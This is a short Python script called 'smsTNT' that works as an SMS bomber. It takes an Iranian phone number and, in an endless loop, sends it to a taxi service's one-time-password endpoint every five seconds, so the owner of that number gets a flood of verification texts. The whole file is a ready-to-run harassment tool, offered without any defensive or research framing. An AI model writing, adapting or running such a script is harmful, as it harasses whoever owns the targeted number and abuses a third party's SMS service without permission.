import requests
from time import sleep
from colorama import Fore
from platform import uname as um
from os import system as sys





try:




    def Page_clear():  # Terminal Clear

        Data_clear = um()[0]

        if Data_clear == 'Linux':

            sys('clear')

        sys('neofetch')

    Page_clear()







    def Bomber():

        Page_clear()

        url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

        Number = int(input(Fore.RED+'┌─['+Fore.GREEN+'smsTNT'+Fore.YELLOW+'~'+Fore.BLUE+'Bomber'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE))

        DataSite = {'cellphone':'+98'+str(Number)}

        while True:


            Sender = requests.post(url, data=DataSite)

            print(Sender)

            sleep(5)

            if Sender.status_code == 200:

                print(Fore.RED+'['+Fore.GREEN+'+'+Fore.RED+']'+Fore.YELLOW+'Send Sms '+Fore.CYAN+'!'+Fore.LIGHTMAGENTA_EX)

            elif Sender.status_code == 400:

                print(Fore.GREEN+'['+Fore.RED+'-'+Fore.GREEN+']'+Fore.YELLOW+'Not Send Sms '+Fore.CYAN+'!'+Fore.LIGHTMAGENTA_EX)






    print(Fore.RED+'['+Fore.WHITE+'1'+Fore.RED+']'+Fore.LIGHTCYAN_EX+' => '+Fore.YELLOW+' Sms Bomber\n')
    sleep(0.15)
    print(Fore.RED+'['+Fore.WHITE+'2'+Fore.RED+']'+Fore.LIGHTCYAN_EX+' => '+Fore.YELLOW+' Send Sms\n')






    selects = int(input(Fore.RED+'┌─['+Fore.GREEN+'smsTNT'+Fore.YELLOW+'~'+Fore.BLUE+'HOME'+Fore.RED+Fore.RED+']'+'\n└──╼> '+Fore.WHITE))

    if selects == 1:

        Bomber()

    elif selects == 2:
        sys('python3 sender.py')





except KeyboardInterrupt:
    print(Fore.BLUE+'\n\nTanks :)\n\n')

except ValueError:
    print(Fore.LIGHTRED_EX+'Error , Pleas Selects Number !')
    sleep(2)
    sys('python3 smsTNT.py')
